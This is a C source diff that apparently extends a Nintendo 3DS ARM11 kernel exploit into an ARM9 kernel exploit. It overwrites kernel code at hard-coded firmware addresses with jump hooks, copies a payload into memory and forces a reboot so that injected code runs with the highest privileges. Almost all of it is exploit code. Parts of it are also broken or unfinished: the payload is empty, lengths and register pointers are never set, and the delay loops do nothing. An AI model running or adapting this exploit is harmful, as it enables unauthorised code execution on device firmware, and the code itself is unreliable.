@@ -5,6 +5,7 @@
 #include <malloc.h>
 #include <dirent.h>
 
+
 u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
 unsigned int patch_addr;
 unsigned int svc_patch_addr;
@@ -13,6 +14,7 @@ unsigned int kversion;
 u8 isN3DS = 0;
 u32 *backup;
 unsigned int *arm11_buffer;
+
 
 //Uncomment to have progress printed w/ printf
 #define DEBUG_PROCESS
@@ -212,9 +214,113 @@ arm11_kernel_execute(int (*func)(void))
 			 "bx lr\t\n");
 }
 
+//arm11 kernel entry point
 void test(void)
 {
 	arm11_buffer[0] = 0xFAAFFAAF;
+	arm9_kernel_exploit_setup();
+}
+
+// not called directly, offset determines jump
+void jump_table(void)
+{
+  func_patch_hook();
+  reboot_func();
+}
+
+ARM9_PAYLOAD(void)
+{
+
+}
+
+arm9_kernel_exploit_setup(void)
+{
+
+#ifdef DEBUG_PROCESS
+	printf("Setting up ARM9 Kernel Exploit\n");
+#endif
+	arm11_buffer[0] = 0xFAAFFAAF;
+	int FUNC_LEN;
+	int ARM9_PAYLOAD_LEN;
+	int (*sub_FFF748C4)(int, int, int, int) = 0xFFF748C4;
+	asm volatile ("clrex");
+
+	InvalidateEntireInstructionCache();
+	InvalidateEntireDataCache();
+	arm11_buffer[0] =0;
+	// ARM9 code copied to FCRAM 0x23F00000
+	memcpy(0xF3F00000, ARM9_PAYLOAD, ARM9_PAYLOAD_LEN);
+	// write function hook at 0xFFFF0C80
+	memcpy(0xEFFF4C80, jump_table, FUNC_LEN);
+
+	// write FW specific offsets to copied code buffer
+	*(int *)(0xEFFF4C80 + 0x60) = 0xFFFD0000; // PDN regs
+	*(int *)(0xEFFF4C80 + 0x64) = 0xFFFD2000; // PXI regs
+	*(int *)(0xEFFF4C80 + 0x68) = 0xFFF84DDC; // where to return to from hook
+
+	// patch function 0xFFF84D90 to jump to our hook
+	*(int *)(0xFFF84DD4 + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
+	*(int *)(0xFFF84DD4 + 4) = 0xFFFF0C80; // jump_table + 0
+
+	// patch reboot start function to jump to our hook
+	*(int *)(0xFFFF097C + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
+	*(int *)(0xFFFF097C + 4) = 0x1FFF4C84; // jump_table + 4
+
+	InvalidateEntireDataCache();
+	
+	sub_FFF748C4(0, 0, 2, 0); // trigger reboot
+}
+
+void func_patch_hook(void)
+{
+  // data written from entry
+  int pdn_regs;
+  int pxi_regs;
+
+  int (*func_hook_return)(void);
+
+  // save context
+  __asm__ ("stmfd sp!, {r0-r12,lr}");
+  // TODO: Why is this needed?
+  __asm__ ("ldr r0, =0x10008000\t\n"
+  		  "1:\t\n"
+           "ldrh r1, [r0,#4]\t\n"
+           "lsls r1, r1, #0x17\t\n"
+           "bmi 1b\t\n"
+           "ldr r0, [r0,#0xC]\t\n"
+           "mov pc, lr");
+  __asm__(".word 0x10008000\n");
+  __asm__ ("ldr r1, =0x10008000\t\n"
+  		  "2:\t\n"
+           "ldrh r2, [r1,#4]\t\n"
+           "lsls r2, r2, #0x1E\t\n"
+           "bmi 2b\t\n"
+           "str r0, [r1,#8]\t\n"
+           "mov pc, lr");
+  __asm__(".word 0x10008000\n");
+  // TODO: What does this do?
+  *(char *)(pdn_regs + 0x230) = 2;
+  int i = 0;
+  for (i = 0; i < 16; i += 2); // busy spin
+  *(char *)(pdn_regs + 0x230) = 0;
+  for (i = 0; i < 16; i += 2); // busy spin
+  // restore context and run the two instructions that were replaced
+  __asm__ ("ldmfd sp!, {r0-r12,lr}\t\n"
+          "ldr r0, =0x44836\t\n"
+          "str r0, [r1]\t\n"
+          "ldr pc, %0" : "=r" (func_hook_return));
+}
+
+// this is a patched version of function 0xFFFF097C
+// stuff found in the original code are skipped
+void reboot_func(void)
+{
+  // disable all interrupts
+  __asm__ ("mrs r0, cpsr\t\n"
+           "orr r0, r0, #0x1C0\t\n"
+           "msr cpsr_cx, r0" ::: "r0");
+  while ( *(char *)0x10140000 & 1 ); // wait for powerup ready
+  *(void **)0x2400000C = 0x23F00000; // our ARM9 payload
 }
 
 arm11_kernel_exec (void)
